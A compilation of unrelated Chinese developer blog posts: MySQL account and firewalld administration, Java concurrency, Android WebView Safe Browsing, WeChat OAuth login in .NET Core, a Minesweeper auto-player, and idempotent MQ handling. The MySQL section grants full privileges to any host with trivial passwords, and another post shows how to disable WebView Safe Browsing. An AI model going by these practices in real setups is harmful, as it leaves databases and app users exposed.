从2016年1月开始写博客，默默地更新《Spring Boot系列教程》，从无人问津到千万访问，作为一个独立站点（http://blog.didispace.com），相信只有那些跟我一样，坚持维护自己独立博客的童鞋才能体会这有多么不容易。
由于没有行业资讯类网站这样的权重优势，各种发布于这些平台上的洗稿文章与相似内容，就算发布时间较晚，它依然可以在百度上占据很大的搜索优势，以至于一些读者在读了其他人发布于CSDN上的一些文章之后看到我的原文，再来我这里喷我抄袭，这样的现象早已经习以为常了。但是庆幸，这些内容的很大一部分读者都是科学上网的好手，我大部分的流量来源都源自谷歌，这点不得不佩服谷歌对原创与一手内容的尊重，这才让我们这些能够独立思考与写作分享的技术人可以一直坚持下去。
不知道从什么时候开始，技术圈里的浮夸运营风也越来越重，各种原本非常有含金量的数据也变得越来越虚假，洗稿、盗版等内容的横行，不断侵害着所有原创作者的切身利益。也许这其中包含各种原因：运营KPI的压力，一些大v自媒体的粗暴价值观宣导，所谓的运营套路分享等等。很多原本坚持原创和自有版权的技术人，也都逐步顶不住诱惑得去制造低质量内容，甚至也去传播盗版侵权内容。
这些环境问题，有时候很想去改变，但是当我想去做什么的时候，才发现自己是多么渺小，因为面对这个现实，要对抗的不是简单的内容发布者，而是那些有背景强大的机构、是那些拥有更大流量的自媒体。想要去改变这样的环境，对于我这样的个体来说几乎是不可能的。
对于这样的现状，我虽然无力去改变，也无法控制别人不要去做那些盗版侵权的事，但是我还是可以继续坚持做好自己。
所以，下面我想给大家推荐一下我在维护的目前全网关注（Star）最多的Spring Boot开源教程项目！因为，接下来对于该项目的内容更新，将列入2019年的主要输出内容计划之一，下周开始，我会以每周至少1-2篇的速度持续更新该系列内容，主要目标是整理最新的Spring 2.1.x的入门指南。如果您关注Spring Boot，并且认可我对该框架的解读，欢迎在文末获取项目地址，点击”Star“关注，第一时间获得更新内容！
一直以来，我从来都没有这样直接的给大家推荐过自己的开源项目。对于我个人而言，一直都是一个比较纯粹的技术人，至今依然每天都有大量的时间花在了阅读和编写代码，享受每天解决问题的成就感与获取新知识的满足感。对于开源项目数据的增长没有KPI压力，也没有对数据的虚荣追求，长期以来这些数据的唯一意义是作为顺带的评价指标，在没有主动索要和刷量的情况下，这些指标对于任何一个开源项目质量的评价有着重要意义（当然放在今日，很多国内项目的数据虚胖问题，相信大家也有所了解，前文也提到了一些背景原因，这里就不做过多导向性的评判）。
下面列一下主要维护的两个渠道信息，截止到现在，我维护的Spring Boot系列教程的两个代码库，累计接近2万Star。
Github
Github是我所有内容的第一更新渠道，所以如果您对后续更新感兴趣，那就Star关注吧！
地址：https://github.com/dyc87112/SpringBoot-Learning

Gitee
Gitee的仓库是Github的镜像仓库，由于网络优势，所以一直都会第一时间同步。这个项目的数据是最另我意外的，在整站所有项目的Star排名中居然位列第二，如果是Gitee的忠实用户也可以直接关注这里，一样会得到最快的更新信息。
地址：https://gitee.com/didispace/SpringBoot-Learning


如果您觉得内容不错，”Star“、”转发“ 支持一下吧~


********************************************************************************************************************************************************************************************************
mysql用户操作、权限分配、远程登录设置
对最近mysql的常用运维命令进行整理
查看使用的哪个配置文件启动的mysql
1.  ps aux|grep mysql|grep 'my.cnf'
如果启动的命令中选择了配置文件，则可以查询出来，也可能查询不到。


2.  mysql --help|grep 'my.cnf'
输出：
order of preference, my.cnf, $MYSQL_TCP_PORT,
/etc/my.cnf /etc/mysql/my.cnf /opt/app/mysql/etc/my.cnf ~/.my.cnf 
启动时选择配置文件的默认顺序从前到后。

3.  locate my.cnf命令可以列出所有的my.cnf文件，或者使用find命令也可以

账户的创建修改和设置权限
1.查看当前已有用户
    连接mysql的通用方式，可以省略其中一部分参数 ：
    mysql -uroot -h 127.0.0.1 -P 3306 -p

    注意：大写P是端口  小写p是密码
    
2. create user创建用户和修改密码和删除
2.1 创建用户：
CREATE USER 'username'@'host' IDENTIFIED BY 'password';

例子:

    CREATE USER 'vinter'@'localhost' IDENTIFIED BY '123456';
    注意
    用户名和host必须加引号否则不能运行
    create user vinter;
    此种写法账户无密码，可以在任意客户端任意ip下登录
    
2.2 修改密码：
2.2.1 最容易记住的，就是直接update user表,update成功后要使用 flush privileges;更新
例如
 update user set password = password('111111') where user = 'vinter';
 
 flush privileges;
2.2.2 使用mysqladmin语法：mysqladmin -u用户名 -p旧密码 password 新密码
mysqladmin -u vinter -p 123 password 456；
2.2.3 使用set password 语句修改
SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
如果是当前登陆用户用SET PASSWORD = PASSWORD("newpassword");
    set password forr 'vinter'@'%'=password('haojia');
2.3 删除用户:
DROP USER username@localhost;
3.使用grant语句设置权限
1. 赋予权限：
格式语句：
grant 权限1,权限2,...权限n on 数据库名称.表名称 to 用户名@用户地址 identified by '连接密码' [with grant option];
权限取值如下：
select,insert,update,delete,create,drop,index,alter,grant,references,reload,shutdown,process,file等
　　数据库名和表名可以使用通配符来表示所有，比如 dbname. 和.
　
例子：
grant all privileges on testdb.* to '‘'vinte'r@'127.0.0.1' identified by '111111';

grant insert,delete,select,update on testdb.* to vinter@127.0.0.1 identified by '111111';

identified by 可以不写，如果写会更改密码为新密码。
注：如果带了 with grant option则被授予权限的人，可以把此权限再转授权（传递）给其他用户。
2. 撤销权限
语法：REVOKE 权限列表 ON db.table FROM 'username'@'localhost';
REVOKE ALL PRIVILEGES ON *.* FROM 'vinter'@'%';

revoke update on *.* from 'vinter'@'%' ;
设置远程登录
我们先说一下实现远程登录mysql的条件
首先mysql必须设置相关的权限，允许该账户远程登录，第二需要防火墙设置了3306端口的远程访问。
1. mysql设置远程访问
可以使用grant语句，可以直接更新user表中相关项。
例子中用户为vinter，ip为192.168.1.111
//固定ip：
grant all privileges on *.* to 'vinter'@'192.168.1.111' identified by '123' with grant option;

insert into user (host,user,password) values('192.168.1.111','vinter',password('123'));


//不限制ip
grant all privileges on *.* to 'vinter'@'%' identified by '123' with grant option;

insert into user (host,user,password) values('%','vinter',password('123'));

2. 防火墙设置（centos7）

常用的如下几个其他的见文后附录：


添加一个端口

firewall-cmd --zone=public --add-port=80/tcp --permanent （--permanent永久生效，没有此参数重启后失效）

重新载入

firewall-cmd --reload

查看

firewall-cmd --zone=public --query-port=80/tcp

查看所有打开的端口

firewall-cmd --zone=public --list-ports
附录 firewalld基本操作
1、firewalld的基本使用
启动： systemctl start firewalld
关闭： systemctl stop firewalld
查看状态： systemctl status firewalld
开机禁用 ： systemctl disable firewalld
开机启用 ： systemctl enable firewalld
2.systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。
启动一个服务：systemctl start firewalld.service
关闭一个服务：systemctl stop firewalld.service
重启一个服务：systemctl restart firewalld.service
显示一个服务的状态：systemctl status firewalld.service
在开机时启用一个服务：systemctl enable firewalld.service
在开机时禁用一个服务：systemctl disable firewalld.service
查看服务是否开机启动：systemctl is-enabled firewalld.service
查看已启动的服务列表：systemctl list-unit-files|grep enabled
查看启动失败的服务列表：systemctl --failed
3.配置firewalld-cmd
查看版本： firewall-cmd --version
查看帮助： firewall-cmd --help
显示状态： firewall-cmd --state
查看所有打开的端口： firewall-cmd --zone=public --list-ports
更新防火墙规则： firewall-cmd --reload
查看区域信息: firewall-cmd --get-active-zones
查看指定接口所属区域： firewall-cmd --get-zone-of-interface=eth0
拒绝所有包：firewall-cmd --panic-on
取消拒绝状态： firewall-cmd --panic-off
查看是否拒绝： firewall-cmd --query-panic
添加端口
firewall-cmd --zone=public --add-port=80/tcp --permanent （--permanent永久生效，没有此参数重启后失效）
重新载入
firewall-cmd --reload
查看
firewall-cmd --zone=public --query-port=80/tcp
删除
firewall-cmd --zone=public --remove-port=80/tcp --permanent

********************************************************************************************************************************************************************************************************
Java 并发编程整体介绍 | 内含超多干货
前段时间一直在学习多线程相关的知识，目前也算有了一个整体的认识，今天呢，主要从整体介绍一下，只谈造火箭，拧螺丝这种细节还需要自己深究。
 
首先是操作系统级别对于多线程的支持，由 CPU 的多级缓存、缓存一致性、乱序执行优化等问题而设计出 Java 内存模型。关于这部分我前面已经总结过。
 
彻底搞懂 CPU 中的内存结构
Java 内存模型 ，一篇就够了！
 
说完了操作系统级别的多线程的后备知识以及 Java 内存模型的设计，接着说说 多线程的实现以及Java 中的多线程是怎么实现的，具体可以看这篇。
 
多线程实现原理
 
上面说的都是一些原理，深层次的东西，你若是不懂，也不影响你使用 Java 多线程来编码，无非就是继承 Thread 实现 Runnable 。但是呢，使用多线程，不可避免的就会出现线程安全问题。
 
虽说我们也知道，不管三七二十一我使用 synchronized 关键字就好使，但是呢，想要知其所以然的同学还是需要好好学习一下上面说的那些原理的。而且，处理线程安全问题会涉及到性能问题，这就是高手之间的差别了。
 
这么一说，我们的重点就放在如何保证线程安全的问题上了，首先，线程安全的特性有 3 个，原子性，可见性，有序性。我们主要看看 Java 中都是使用什么方式来保证这 3 个特性的。
 
主要的体现在 atomic 包、CAS 思想、synchronized 锁、Lock 锁、volatile 关键字、还有一个非常重要的 JUC 包，别急，后面一个一个的说。
 
哎，发现我已经说了 atomic 和 CAS 了，atomic包、synchronized | Java 中线程安全 关于 volatile 关键字，在 JVM 中的语义，即为防止指令重排并添加内存屏障，简单来说就是限制指令的执行顺序，并默认添加一些指令（内存屏障）以达到有序和可见性的目的。比方说在 volatile 变量读操作之前必须先完成写。
 
简单提一下，使用 volatile 修饰的变量不一定是线程安全的，除非对变量的操作都是原子性的。
 
在说 JUC 之前，先说一种比较讨巧的手段来处理多线程问题，我们知道多线程中存在问题主要就是在不同线程之间对共享变量进行操作，使得数据变脏。那我们在多线程中杜绝出现共享变量就行了呀，基于此，也就出现了 ThreadLocal 这个类。
 
ThreadLocal 也被称为线程局部变量，实际上它是封装了一个当前线程为 K 的一个 Map，将需要用到的变量存进 Map，用的时候取出来，而这个 Map 又是线程私有的，其它线程无法访问，自然是线程安全的。
 
使用 ThreadLocal 有个实际的例子，我们在过滤器中添加变量到 ThreadLocal 中，在拦截器中删除 ThreadLocal 中的值，这个变量可能是用户唯一性的标识或是其它，因为每一个请求都会触发一个线程执行，经过过滤器之后设置好变量，在方法中使用，而在拦截器中对请求处理之后即可对 ThreadLocal 中的数据进行清除，不然会发生内存泄漏。
 
为什么 ThreadLocal 可以保证线程安全，因为它存放的变量都是线程私有的，还有一种我们经常定义的变量也是线程私有的，那就是我们定义的局部变量，方法内的变量。因为这些变量是存放在线程栈上面，这部分区域是线程私有的，也就是我们之前说的工作内存的概念，所以我们经常写局部变量，而从来没有考虑过线程安全问题，实际原因在这。
 
线程私有可以保证线程安全，但是全局变量又是少不了一环，偶尔定义了那么一个，一不留神，在多线程环境中可能就会出错。最最常说的无非就是那几个集合类和 String 相关的类，当然还有其它的不安全的类，可能你已经使用了但还不知道。
 
既然知道不安全了，那在多线程的环境中就避免使用它，而贴心的 JDK 也提供了一套与之对应的安全的类给我们使用，我们要做的就是知道哪些类是不安全的，对应的安全的类是什么以及如何保证的安全。
 
先说 String、StringBuffer、StringBuilder 之间细微的差别，String 是不可变类，不可变类本身就是定义的时候就是线程安全的，关于不可变类这又是一块知识，暂时不说了。
 
但是也正是因为 String 的不可变，所以每次对字符串的修改都会新创建一个字符串，而最终我们想要得到的可能就是最后的一个值，中间那些中间值太占空间。嗯，优化之后就有了后面两兄弟。
 
简单说 StringBuffer 是线程安全的，而 StringBuilder 是不安全的，这两个较 String 都是可变对象。所以说，在单线程中使用 StringBuilder 代替 String ，多线程中使用 StringBuffer 代替 String 是个不错的选择。对了，StringBuffer 保证线程安全的手段也就是使用 synchronized 方法。
 
还有就是关于集合类相关的线程安全操作，有一个 Collections 工具类，提供了一套 synchronizedXXX 方法，好吧，都写在脸上了，这样一来，List、Set、Map 都摇身一变安全了。
 
还有一些古老的实现类，像什么 Vector，Hashtable，也是可以实现线程安全的，但是一来是基本不使用，二是有些情况下可能并不能保证线程安全，像 Vector 中的  add 和 remove 方法就是没有进行同步操作，在某些情况下就会出现不安全。
 
不知道你们有没有发现，这些古老的实现类中实现安全的方式无非就是添加 synchronized 关键字。有没有高级一点的操作啊，肯定有，但是今天扯不动了，下次再说吧！
 
简单总结一下，今天说了什么，回顾之前的文章并理顺了整体的思路，从底层原理到 JMM，从多线程的实现到如何保证线程安全，又举例说明了 JDK 中类的设计思路，后面的 JUC 设计的更秀。
 
说的挺多，但是万变不离其宗，做好分类，学习记忆更便捷，Java 保证线程安全底层看 3 大特性，语言实现层面主要看锁，锁也就两大类 synchronized 和 Lock，只不过分支极多而已，还有一层是算法层面，像什么 CAS 。但是，回到 CPU 时代还他么都是 0、1 代码，所以，不要怂就是干！
********************************************************************************************************************************************************************************************************
WebView，我已经长大了，知道自己区分是否安全了！
一、前言
如果你在用 Android 原生系统（Google Play 服务），在使用 WebView 加载某些网页时，一定遇到过以下的安全警告红屏。

这是 WebView 的安全浏览保护策略，在 Android 8.0（API Level 26）开始的默认策略，被应用在所有 App 的 WebView 当中。
Google 会自己维护一套“不安全”网站的列表，并通过 Google Play 服务，同步到所有的设备上。当你要访问某些被标记为“不安全”的网站时，它就会以此“红屏”警告用户。
注意这是默认策略，虽然出发点是为了保护用户，但是有时候我们自己的 App 还是要有自主管控的权利。
那我们有办法在自己的 App 内，关闭此项保护吗？毕竟我的应用我做主，安不安全自己来管控。
今天就来聊聊，如何在 Android 8.0（API Level 26）中，关闭此安全保护策略。
二、什么是WebView的安全策略
自 2018 年 4 月起，随着 WebView 66 发布，Google Play 保护机制，将在 WebView 中默认开始此安全浏览策略。
而 Android 开发者在使用 WebView 时，无需再进行任何更改，即可享受此项保护服务。自 Android 8.0 开始，WebView 中即已经集成安全浏览功能，并且与 Android 版的 Chrome 采用相同的底层技术。
一旦触发 WebView 的安全机制，就会出现类似下图这样的“红屏”警告。

Google 会自维护一套不良网站的列表，以确保用户可以在浏览之前，发出警告。为了同步这部分列表，Google 花费了很大的努力，就是为了保护用户的安全。
三、如何控制安全策略
在 Android 8.0 及以上的设备中，WebView 的安全浏览策略，是默认生效的。
也就是说，如果我们想要使用它，我们什么额外的工作都不需要做，但是我们如果不想采用它，就需要通过一个方法将其关闭。
3.1 如何监控开启
WebView 的安全浏览，是依赖于 Google Play 和 Chrome 更新的，也就是说，虽然你的设备是 Android 8.0，但是此策略也是有可能没有生效的。
那么如何确定此功能是否生效呢？
WebView 提供了一个方法 startSafeBrowsing() 方法，来主动开启安全浏览策略，在回调中，我们可以知道当前设备是否准备好了，符合开启安全浏览的条件。
WebView.startSafeBrowsing(this, object : ValueCallback<Boolean> {
    override fun onReceiveValue(value: Boolean?) {
        val isOpen = value ?:false
        if (isOpen) {
            Log.i("cxmy_dev", "Safe browsing. On")
        } else {
            Log.i("cxmy_dev", "Safe browsing. Off")
        }
    }
})
注意回调内的 value 可能为 null。
3.2 如何关闭安全策略
WebView 的安全策略是默认开始的，如果想要关闭它，需要通过 WebSettings 这个类，其中有 setSafeBrowsingEnabled(boolean) 方法，可以用于设置是否开启安全模式。
webSettings.safeBrowsingEnabled = false
此方法是一种全局的策略，也就是要么开启、要么关闭。
3.3 配置白名单
使用 setSafeBrowsingEnable() 方法，只能做二态的设置，要么开启要么关闭。如果我们想设置，只允许某些 Host 不经过安全策略校验，如何设置呢？
WebView 还提供了一个 setSafeBrowsingWhiteList() 的方法，用于设置一个安全策略的白名单。
var array = ArrayList<String>()
array.add("example.com")
WebView.setSafeBrowsingWhitelist(array, object : ValueCallback<Boolean> {
    override fun onReceiveValue(value: Boolean?) {
    }
})
setSafeBrowsingWhiteList() 方法很灵活，可以通过配置指定域名及其子域名，或者仅此域名不包含其子域名。还可以直接配置 IP 地址，支持 IPV4 和 IPV6。

四、小结时刻
今天我们聊到如何关闭 WebView 的安全浏览策略，本文涉及的 API，全部仅支持 API Level 27，使用的时候注意判断。
当然，WebView 的安全浏览是有必要的，所以如果你的域名被 Google 误认为是危险链接，可以通过申述的方式解封，申述地址。
本文对你有帮助吗？留言、点赞、转发是最大的支持，谢谢！

references:
protecting-hundreds-of-millions-mores
Webkit-WebView
whitepaper



公众号后台回复成长『成长』，将会得到我准备的学习资料，也能回复『加群』，一起学习进步；你还能回复『提问』，向我发起提问。

推荐阅读：
关于字符编码，你需要知道的都在这里 | 图解：HTTP 范围请求 | Java 异常处理 | 安卓防止用户关闭动画导致动画失效 | Git 找回遗失的代码 | 阿里的 Alpha 助力 App 启动速度优化


********************************************************************************************************************************************************************************************************
.net Core2.2 WebApi通过OAuth2.0实现微信登录
前言
微信相关配置请参考 微信公众平台 的这篇文章。注意授权回调域名一定要修改正确。
微信网页授权是通过OAuth2.0机制实现的，所以我们可以使用 https://github.com/china-live/QQConnect 这个开源项目提供的中间件来实现微信第三方登录的流程。
开发流程
1、新建一个.net core webapi 项目。在NuGet中查找并安装 AspNetCore.Authentication.WeChat 包。
2、修改 appsettings.json 配置文件，增加以下配置：

 1 "Authentication": {
 2     "WeChat": {
 3       "AppId": "微信AppID",
 4       "AppSecret": "微信AppSecret"
 5     }
 6   },
 7   "Logging": {
 8     "LogLevel": {
 9       "Default": "Debug", //日志级别从低到高，依次为：Debug,Information,Warning,Error,None
10       "Microsoft.EntityFrameworkCore": "Error",
11       "System": "Error"
12     }
13   }

3、修改 Startup

1         services.AddSingleton<IHttpContextAccessor, HttpContextAccessor>();
2         services.AddAuthentication()
3                 .AddWeChat(wechatOptions =>
4                 {
5                     wechatOptions.AppId = Configuration["Authentication:WeChat:AppId"];
6                     wechatOptions.AppSecret = Configuration["Authentication:WeChat:AppSecret"];
7                     wechatOptions.UseCachedStateDataFormat = true;
8                 });

4、新增 AccountController

 1     [Route("api/[controller]")]
 2     [ApiController]
 3     public class AccountController : ControllerBase
 4     {
 5         private const string LoginProviderKey = "LoginProvider";
 6         private const string Provider_WeChat = "WeChat";
 7         private readonly ILogger _logger;
 8         private readonly IHttpContextAccessor _contextAccessor;
 9 
10         public AccountController(ILogger<AccountController> logger,
11             IHttpContextAccessor contextAccessor)
12         {
13             _logger = logger;
14             _contextAccessor = contextAccessor;
15         }
16         /// <summary>
17         /// 微信登录
18         /// </summary>
19         /// <param name="redirectUrl">授权成功后的跳转地址</param>
20         /// <returns></returns>
21         [HttpGet("LoginByWeChat")]
22         public IActionResult LoginByWeChat(string redirectUrl)
23         {
24             var request = _contextAccessor.HttpContext.Request;
25             var url = $"{request.Scheme}://{request.Host}{request.PathBase}{request.Path}Callback?provider={Provider_WeChat}&redirectUrl={redirectUrl}";
26             var properties = new AuthenticationProperties { RedirectUri = url };
27             properties.Items[LoginProviderKey] = Provider_WeChat;
28             return Challenge(properties, Provider_WeChat);
29         }
30         /// <summary>
31         /// 微信授权成功后自动回调的地址
32         /// </summary>
33         /// <param name="provider"></param>
34         /// <param name="redirectUrl">授权成功后的跳转地址</param>
35         /// <returns></returns>
36         [HttpGet("LoginByWeChatCallback")]
37         public async Task<IActionResult> LoginByWeChatCallbackAsync(string provider = null, string redirectUrl = "")
38         {
39             var authenticateResult = await _contextAccessor.HttpContext.AuthenticateAsync(provider);
40             if (!authenticateResult.Succeeded) return Redirect(redirectUrl);
41             var openIdClaim = authenticateResult.Principal.FindFirst(ClaimTypes.NameIdentifier);
42             if (openIdClaim == null || openIdClaim.Value.IsNullOrWhiteSpace())
43                 return Redirect(redirectUrl);
44             //TODO 记录授权成功后的微信信息 
45             var city = authenticateResult.Principal.FindFirst("urn:wechat:city")?.Value;
46             var country = authenticateResult.Principal.FindFirst(ClaimTypes.Country)?.Value;
47             var headimgurl = authenticateResult.Principal.FindFirst(ClaimTypes.Uri)?.Value;
48             var nickName = authenticateResult.Principal.FindFirst(ClaimTypes.Name)?.Value;
49             var openId = authenticateResult.Principal.FindFirst(ClaimTypes.NameIdentifier)?.Value;
50             var privilege = authenticateResult.Principal.FindFirst("urn:wechat:privilege")?.Value;
51             var province = authenticateResult.Principal.FindFirst("urn:wechat:province")?.Value;
52             var sexClaim = authenticateResult.Principal.FindFirst(ClaimTypes.Gender);
53             int sex = 0;
54             if (sexClaim != null && !sexClaim.Value.IsNullOrWhiteSpace())
55                 sex = int.Parse(sexClaim.Value);
56             var unionId = authenticateResult.Principal.FindFirst("urn:wechat:unionid")?.Value;
57             _logger.LogDebug($"WeChat Info=> openId: {openId},nickName: {nickName}");
58             return Redirect($"{redirectUrl}?openId={openIdClaim.Value}");
59         }
60     }

5、将网站发布到外网，请求

https://你的授权域名/api/account/LoginByWeChat?redirectUrl=授权成功后要跳转的页面

 即可调起微信授权页面。
注意

微信授权必须使用https


微信开放平台和微信公众平台都有提供网站用微信登录的接口，前者适用于任何网站，后者只适用于微信服务号的内嵌网站

 
本篇相关源码地址：https://github.com/ren8179/QrF.OAuth.WeChat/tree/master
 
********************************************************************************************************************************************************************************************************
一个扫雷游戏和一个自动玩扫雷游戏的程序
    年前无意看到一个用Python写的小桌面程序，可以自动玩扫雷的游戏，觉得挺有意思，决定用C#也做一个。【真实情况是：我知道Python最近比较火，非常适合搞爬虫、大数据、机器学习之类的，但现在连桌面程序都用Python做了吗？还给不给.NET程序员活路了？简直不能忍！】
   春节期间正好有闲就搞了一下，先下载了一个第三方的扫雷游戏，实现功能以后觉得下载的这个扫雷游戏分辨率太低了，也不好看，所以又自己做了一个扫雷游戏，凑成一套。
    源码下载地址：https://github.com/seabluescn/AutoMineSweeper
    需要提前说明的是，这两个程序是独立的，之间没有任何接口与联系，自动扫雷的程序通过读取屏幕信息获取游戏状态，并模拟鼠标操作来进行游戏。下面就几个相关技术点和大家分享一下。
 
1、获取应用程序窗口

       [DllImport("user32.dll")]
       private static extern int GetWindowRect(IntPtr hwnd, out Rect lpRect);

       private Rect GetWindowRect()
        {
            Process[] processes = Process.GetProcesses();
            Process process = null;
            for (int i = 0; i < processes.Length - 1; i++)
            {
                process = processes[i];
                if (process.MainWindowTitle == "MineSweeper")
                {
                    break;
                }                
            }         

            Rect rect = new Rect();
            GetWindowRect(process.MainWindowHandle, out rect);

            return rect;
        }

 
2、屏幕截图

            Rect rect = GetWindowRect();

            int left = rect.Left;
            int top = rect.Top; 

            int centerleft = 21;    //偏移
            int centertop = 93;
            int centerwidth = 300;
            int centerheight = 300;
           
            Bitmap bitmapCenter = new Bitmap(centerwidth, centerheight);
            using (Graphics graphics = Graphics.FromImage(bitmapCenter))
            {
                graphics.CopyFromScreen(left + centerleft, top + centertop, 0, 0, new Size(centerwidth, centerheight));
                this.pictureBox1.Image?.Dispose();
                this.pictureBox1.Image = bitmapCenter;
            }

截图后，根据图片上固定位置的颜色信息判断该位置的状态，最终形成一个数组。
 
3、模拟鼠标点击

        [DllImport("user32")]
        private static extern int mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        const int MOUSEEVENTF_MOVE = 0x0001; //移动鼠标
        const int MOUSEEVENTF_LEFTDOWN = 0x0002; //模拟鼠标左键按下
        const int MOUSEEVENTF_LEFTUP = 0x0004; //模拟鼠标左键抬起
        const int MOUSEEVENTF_RIGHTDOWN = 0x0008; //模拟鼠标右键按下
        const int MOUSEEVENTF_RIGHTUP = 0x0010; //模拟鼠标右键抬起
        const int MOUSEEVENTF_MIDDLEDOWN = 0x0020; //模拟鼠标中键按下
        const int MOUSEEVENTF_MIDDLEUP = 0x0040; //模拟鼠标中键抬起
        const int MOUSEEVENTF_ABSOLUTE = 0x8000; //标示是否采用绝对坐标

                int clickPointX = X * 65535 / Screen.PrimaryScreen.Bounds.Width;
                int clickPointY = Y * 65535 / Screen.PrimaryScreen.Bounds.Height;

               //移动鼠标
                mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, clickPointX, clickPointY, 0, 0);

                //左键点击
                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                
               //右键点击
                mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                

 
4、游戏算法
获得游戏状态后，需要判断下一步操作，是点开某个位置还是右键标记某个位置，算法循环遍历所有方块，一共三步：
1）基础算法
基础算法1：对于已经翻开的块，中心数字和周围已经标记的雷数一致，其周围所有未知位置都不是雷，左键点开
基础算法2：对于已经翻开的块，中心数字=未知位置数量+周围已经标记的雷数 ：其周围所有未知位置均为雷，右键标记
2）高一级算法
先计算所有已翻开的块，其周围未知块含雷的数量之和。
算法1：对于已经翻开的块，如果周围未知块超过2个，其中有一个未知块：中心数字-雷==其他位置块组合雷数总和：该未知块必不是雷
算法2：对于已经翻开的块，如果周围未知块超过2个，其中有一个未知块：数字-雷-其他位置块组合雷数=1：该未知块必是雷
3）实在没有找到合适的点，只能随机点开
对所有未知的点，计算一下周围雷的概率，选择概率最小的点开。
 
经测试，程序对目标状态的识别率为100%，智能程度还不错，比一般人玩的好，无聊时可以看它玩一天。
 
********************************************************************************************************************************************************************************************************
实战并发-使用分布式缓存和有限状态机
简介    
这里的并发不是高并发，只是将正式环境的一小段流量同时打到我的自测环境。一个请求同时多次发送，真正意义上并发处理同一个数据，主要需求是保证数据幂等性和正确性。
主要技术是用分布式缓存做多次相同请求的幂等处理和用有限状态机来解决MQ消息的不保证有序。
 
场景
k8s集群可以进行事件监听，静儿这次使用了一个美团内网线下的小集群。把这个小集群的对node节点和pod节点的监听事件发送到MQ，3台服务器在同时工作。也就是说一个事件会被重复收到三次。其中两台机器事件发送基本上是同时的，剩下一台是我自己的电脑。因为在家里，连着vpn，连接公司内网大概有2.5ms的延时。
在MQ事件的接收端，美团内部监控系统CAT上看到数据如下：

 
问题
当一个请求被重复在并发和有延迟的情况下会被重复收到。k8s自身也会短时间发送一些相同的请求。这些重复的请求在不考虑重复执行的副作用前提下，每次都同样的方式执行，后端的压力也会非常大。如果考虑重复执行的副作用，就是说重复的请求不幂等，数据不准确了，整个服务就非常糟糕了。
另外，不管是MQ还是k8s事件，接收处理事件的服务都不能保证先收到的事件是先产生的。多台机器的情况下，就算是先产生的，也会因为不同机器的处理速度不一样，导致后产生的事件先被执行。
 
解决
如果下面解决方法中的概念不是很清楚，可以先看5W，再回来看方法。
使用分布式缓存解决请求去重的问题
首先考虑对请求处理的维度。比如静儿举例的场景中，对node节点的watch事件，可以用node作为缓存的key，用node需要处理的关键字段作为value。如果请求中的信息与缓存中的一致，则直接返回不处理。不一致则先更新缓存为最新值，再进行处理。
注意，因为保证消息不会被并发处理。刚才的缓存值获取get和重设put操作都是用分布式锁进行了加锁的。
使用有限状态机解决乱序的问题
之所以有「乱序」这个定义，说明系统本身是消息的顺序是有要求的。顺着这个思路来考虑，可以顺理成章的得到解决方案：设定好原本的一个介绍顺序。如果收到事件A则执行事件B。如果收到事件B则执行事件C。如果没收到事件A先收到了事件B，则把MQ消息打回去重发。在打回去的阶段事件A收到处理完了，这时候再收到事件B就可以继续执行了。
刚才说的这种执行顺序的方法就是有限状态机。有限状态机在程序里的实现主要有两种。一种是通过switch case的方法。就是如果A则B的最容易理解的实现。通常被称为“可执行代码”方式。
另外一种方式是：如果每种状态要做的处理比较复杂。用switch case比较难看。就可以将处理方法抽象成一个类。将这些类的实例放到映射表里。这种实现通常被称为“被动数据”方式。
 
5W
Q：为什么MQ消息不保证有序？
A：因为MQ消息在服务器上是分区存储的，每个分区自己是有序的。分区被接收端消费的时候。一般也是多个接收端一起消费。中间的每个环节都是只能保证局部有序。如果想全局有序。就需要分区只有一个，并且接收端服务器是单点，而且一次只处理一个请求。
Q：MQ的使用上还有什么关键注意点？
A：一般情况下MQ除了不保证消息有序还不保证消息不重复。因为在「网络不可达」的情况下，MQ不能确认消息接收方收到了消息必然会重试。重试除了本文讲的幂等处理外，还可以采用每个消息有唯一的ID+去重表实现。
Q：什么是分布式缓存？
A：分布式缓存有时候也叫「集中式缓存」。是相对于「本地缓存」而言的。因为在目前的多服务器部署(分布式)时代。「本地缓存」这种将信息存储于当前服务器上，其他服务器无法感知。这时候采用一个专门的缓存服务器就可以解决这个问题。这就是分布式缓存了。
Q：什么是有限状态机？
A：有限状态机也称为FSM(Finite State Machine)，是表示有限个状态以及在这些状态之间的转移和动作等行为的数学模型。FSM可以把模型的多状态、多状态建的转换条件解耦。可以使维护变得容易，代码也更加具有可读性。
 
总结
并发问题对系统的影响
系统压力造成的可用性问题、多个请求同时对同一个数据产生作用产生的数据准确性问题。
解决方案
可用性问题可以从设计上在业务逻辑层之前对数据去重，例如可以使用分布式锁，让真正耗时的业务逻辑对相同的多个请求只执行一次。
数据准确性问题可以通过有限状态机保证不论收到请求顺序如何，都按照正确的逻辑来执行。
相关阅读     
《程序常用的设计技巧》
《到底多大才算高并发？》
《美团分布式服务通信框架及服务治理系统OCTO》
《学会用数据说话-分布式锁究竟可以多少并发？》
《大话高可用》
《业务开发转基础开发，这三种「高可用」架构你会么？》
********************************************************************************************************************************************************************************************************
通过 Sqoop1.4.7 将 Mysql5.7、Hive2.3.4、Hbase1.4.9 之间的数据导入导出

    目录
    
        
        目录
        1、什么是 Sqoop？
        2、下载应用程序及配置环境变量
        2.1、下载 Sqoop 1.4.7
        2.2、设置环境变量
        2.3、设置安装所需环境
        
        3、安装 Sqoop 1.4.7
        3.1、修改 Sqoop 配置文件
        3.1.1、修改配置文件 sqoop-env.sh
        3.1.2、修改配置文件 configure-sqoop
        
        3.2、查看 Sqoop 版本
        
        4、启动和测试 Sqoop 的数据导入、导出
        4.1、Sqoop 通过 Hive 导入数据到 Sqoop
        4.2、Sqoop 通过 MySql 导入数据到 Hive
        4.3、Sqoop 通过 MySql 导入数据到 Hbase
        
        
    

目录
1、什么是 Sqoop？
  Sqoop 是一种用于在 Hadoop 和关系数据库或大型机之间传输数据的工具。
